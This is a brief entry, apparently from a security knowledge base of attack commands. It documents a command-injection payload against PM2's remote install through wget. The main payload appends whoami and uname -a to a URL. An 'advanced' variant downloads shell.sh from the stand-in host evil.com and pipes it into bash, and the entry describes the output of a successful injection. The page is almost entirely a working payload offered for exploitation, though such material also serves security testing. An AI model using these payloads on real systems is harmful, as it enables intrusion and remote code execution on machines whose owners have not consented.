---
id: uuid-remote-payload
data: 'http://localhost:8000/some.tar.gz;whoami;uname -a;'
tags:
  - payload
  - remote
  - injection
type: command
output: 'Wget attempts download, but injected commands execute and print output'
executor: bash
platforms:
  - Node.js
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.540Z'
verified: false
validated: true
submitted: true
---
# remote-url-payload

## Command

```bash
http://localhost:8000/some.tar.gz;whoami;uname -a;
```

## Description

Malicious URL payload for pm2.install() remote installation, injecting system commands after wget via shell interpretation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|

## Examples

### Basic Usage

```bash
http://localhost:8000/some.tar.gz;whoami;uname -a;
```

### Advanced Usage

```bash
https://evil.com/payload.tar.gz;curl -s evil.com/shell.sh | bash;
```

## Expected Output

When used in wget, downloads file but executes whoami (e.g., 'bl4de') and uname -a (e.g., 'Darwin hostname 18.7.0'), printing to stdout.

## Related

- [[procedures/Exploit-PM2-Remote-URL-Command-Injection]]
- [[commands/wget-spawn-sink]]
